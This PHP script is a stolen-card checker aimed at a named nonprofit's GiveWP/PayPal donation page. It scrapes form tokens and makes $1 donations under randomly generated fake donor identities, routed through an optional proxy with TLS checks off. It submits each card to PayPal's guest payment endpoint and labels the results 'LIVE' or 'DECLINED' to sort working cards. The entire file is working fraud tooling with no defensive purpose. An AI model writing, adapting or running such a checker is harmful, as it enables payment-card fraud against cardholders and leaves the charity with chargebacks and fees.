<?php
// PayPal $1 Charge Gateway
// Site: awwatersheds.org | GiveWP + PayPal Commerce

header('Content-Type: text/plain');

$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';

if (empty($card)) {
    echo "ERROR: No card provided";
    exit;
}

// Parse card
$parts = explode('|', $card);
if (count($parts) < 4) {
    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
    exit;
}

list($cardNumber, $month, $year, $cvv) = $parts;

// Clean up year
if (strlen($year) == 2) $year = '20' . $year;

// Generate random donor info
$firstNames = ["James","Mary","Robert","Patricia","John","Jennifer","Michael","Linda","William","Elizabeth","David","Barbara","Richard","Susan","Joseph","Jessica","Thomas","Sarah","Christopher","Karen","Daniel","Lisa","Matthew","Nancy","Anthony","Betty","Mark","Margaret","Donald","Sandra","Steven","Ashley","Paul","Dorothy","Andrew","Kimberly","Joshua","Emily","Kenneth","Donna"];
$lastNames = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin","Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson","Walker"];

$addresses = [
    ["line1" => "742 Evergreen Terrace", "city" => "Springfield", "state" => "IL", "zip" => "62704"],
    ["line1" => "123 Maple Street", "city" => "Anytown", "state" => "NY", "zip" => "10001"],
    ["line1" => "456 Oak Avenue", "city" => "Riverside", "state" => "CA", "zip" => "92501"],
    ["line1" => "789 Pine Road", "city" => "Lakewood", "state" => "CO", "zip" => "80226"],
    ["line1" => "321 Elm Boulevard", "city" => "Portland", "state" => "OR", "zip" => "97201"]
];

$phonePrefixes = ["212","310","312","415","602","713","206","305","404","503"];
$emailDomains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com"];

$firstName = $firstNames[array_rand($firstNames)];
$lastName = $lastNames[array_rand($lastNames)];
$address = $addresses[array_rand($addresses)];
$phone = $phonePrefixes[array_rand($phonePrefixes)] . rand(1000000, 9999999);
$email = strtolower($firstName) . rand(10, 9999) . '@' . $emailDomains[array_rand($emailDomains)];

// Step 1: Scrape tokens from donation page
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://awwatersheds.org/donate/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_COOKIEFILE, '');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_paypal.txt');

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$html = curl_exec($ch);
curl_close($ch);

// Extract tokens
preg_match('/name="give-form-hash" value="(.*?)"/', $html, $hashMatch);
preg_match('/name="give-form-id-prefix" value="(.*?)"/', $html, $pfxMatch);
preg_match('/name="give-form-id" value="(.*?)"/', $html, $idMatch);

if (empty($hashMatch) || empty($pfxMatch) || empty($idMatch)) {
    echo "DECLINED: Could not extract payment tokens";
    exit;
}

$formHash = $hashMatch[1];
$formPrefix = $pfxMatch[1];
$formId = $idMatch[1];

// Step 2: Register donation
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://awwatersheds.org/wp-admin/admin-ajax.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "X-Requested-With: XMLHttpRequest",
    "Content-Type: application/x-www-form-urlencoded"
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_paypal.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_paypal.txt');

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$postData = http_build_query([
    "give-honeypot" => "",
    "give-form-id-prefix" => $formPrefix,
    "give-form-id" => $formId,
    "give-form-title" => "Sustainers Circle",
    "give-current-url" => "https://awwatersheds.org/donate/",
    "give-form-url" => "https://awwatersheds.org/donate/",
    "give-form-hash" => $formHash,
    "give-price-id" => "custom",
    "give-amount" => "1.00",
    "payment-mode" => "paypal-commerce",
    "give_first" => $firstName,
    "give_last" => $lastName,
    "give_email" => $email,
    "give-lake-affiliation" => "Other",
    "give_action" => "purchase",
    "give-gateway" => "paypal-commerce",
    "action" => "give_process_donation",
    "give_ajax" => "true"
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
$response = curl_exec($ch);
curl_close($ch);

// Step 3: Create PayPal order
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://awwatersheds.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
curl_setopt($ch, CURLOPT_HTTPHEADER, ["X-Requested-With: XMLHttpRequest"]);
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_paypal.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_paypal.txt');

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$orderData = http_build_query([
    "give-honeypot" => "",
    "give-form-id-prefix" => $formPrefix,
    "give-form-id" => $formId,
    "give-form-hash" => $formHash,
    "payment-mode" => "paypal-commerce",
    "give-amount" => "1.00",
    "give-gateway" => "paypal-commerce"
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $orderData);
$orderResponse = curl_exec($ch);
$orderResult = json_decode($orderResponse, true);
curl_close($ch);

if (!$orderResult || !isset($orderResult['data']['id'])) {
    echo "DECLINED: Failed to create PayPal order";
    exit;
}

$orderId = $orderResult['data']['id'];

// Step 4: Send card to PayPal GraphQL
function detectCardType($number) {
    $number = preg_replace('/[^0-9]/', '', $number);
    if (preg_match('/^4/', $number)) return "VISA";
    if (preg_match('/^5[1-5]/', $number) || preg_match('/^2[2-7]/', $number)) return "MASTER_CARD";
    if (preg_match('/^3[47]/', $number)) return "AMEX";
    if (preg_match('/^6(?:011|5)/', $number)) return "DISCOVER";
    return "VISA";
}

$cardType = detectCardType($cardNumber);
$expiryYear = substr($year, -2);
$fullYear = strlen($year) == 2 ? '20' . $year : $year;

$graphqlQuery = '
mutation payWithCard(
    $token: String!
    $card: CardInput
    $firstName: String
    $lastName: String
    $billingAddress: AddressInput
    $email: String
) {
    approveGuestPaymentWithCreditCard(
        token: $token
        card: $card
        firstName: $firstName
        lastName: $lastName
        email: $email
        billingAddress: $billingAddress
        shippingAddress: $billingAddress
    ) {
        flags { is3DSecureRequired }
        cart { cartId }
        paymentContingencies {
            threeDomainSecure { status redirectUrl { href } }
        }
    }
}';

$variables = [
    "token" => $orderId,
    "card" => [
        "cardNumber" => $cardNumber,
        "type" => $cardType,
        "expirationDate" => $month . '/' . $fullYear,
        "postalCode" => $address['zip'],
        "securityCode" => $cvv
    ],
    "firstName" => $firstName,
    "lastName" => $lastName,
    "email" => $email,
    "billingAddress" => [
        "givenName" => $firstName,
        "familyName" => $lastName,
        "line1" => $address['line1'],
        "city" => $address['city'],
        "state" => $address['state'],
        "postalCode" => $address['zip'],
        "country" => "US"
    ]
];

$graphqlPayload = json_encode([
    "query" => $graphqlQuery,
    "variables" => $variables
]);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $graphqlPayload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Host: www.paypal.com",
    "Paypal-Client-Context: {$orderId}",
    "Content-Type: application/json",
    "Origin: https://www.paypal.com",
    "Referer: https://www.paypal.com/smart/card-fields?token={$orderId}"
]);

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$graphqlResponse = curl_exec($ch);
curl_close($ch);

// Step 5: Approve order
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://awwatersheds.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={$orderId}");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["X-Requested-With: XMLHttpRequest"]);
curl_setopt($ch, CURLOPT_COOKIEFILE, '/tmp/cookies_paypal.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, '/tmp/cookies_paypal.txt');

if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
}

$approveData = http_build_query([
    "give-honeypot" => "",
    "give-form-id-prefix" => $formPrefix,
    "give-form-id" => $formId,
    "give-form-hash" => $formHash,
    "payment-mode" => "paypal-commerce",
    "give-amount" => "1.00",
    "give-gateway" => "paypal-commerce"
]);

curl_setopt($ch, CURLOPT_POSTFIELDS, $approveData);
$approveResponse = curl_exec($ch);
curl_close($ch);

// Clean up cookies
@unlink('/tmp/cookies_paypal.txt');

// Analyze response
$combined = $graphqlResponse . " " . $approveResponse;
$combinedUpper = strtoupper($combined);

if (strpos($combinedUpper, 'APPROVESTATE":"APPROVED') !== false) {
    echo "APPROVED: Payment charged successfully";
} elseif (strpos($combinedUpper, 'CVV2_FAILURE') !== false || strpos($combinedUpper, 'INVALID_SECURITY_CODE') !== false) {
    echo "APPROVED: Card is LIVE (CVV2 failure)";
} elseif (strpos($combinedUpper, 'INVALID_BILLING_ADDRESS') !== false) {
    echo "APPROVED: Card is LIVE (AVS failed)";
} elseif (strpos($combinedUpper, 'INSUFFICIENT_FUNDS') !== false) {
    echo "APPROVED: Insufficient funds (LIVE card)";
} elseif (strpos($combinedUpper, '3DSECURE') !== false || strpos($combinedUpper, 'IS3DSECUREREQUIRED') !== false) {
    echo "3DS: 3D Secure authentication required";
} elseif (strpos($combinedUpper, 'DO_NOT_HONOR') !== false) {
    echo "DECLINED: Do Not Honor";
} elseif (strpos($combinedUpper, 'EXPIRED_CARD') !== false) {
    echo "DECLINED: Card expired";
} elseif (strpos($combinedUpper, 'INVALID_CARD') !== false) {
    echo "DECLINED: Invalid card number";
} else {
    echo "DECLINED: Card declined";
}
?>
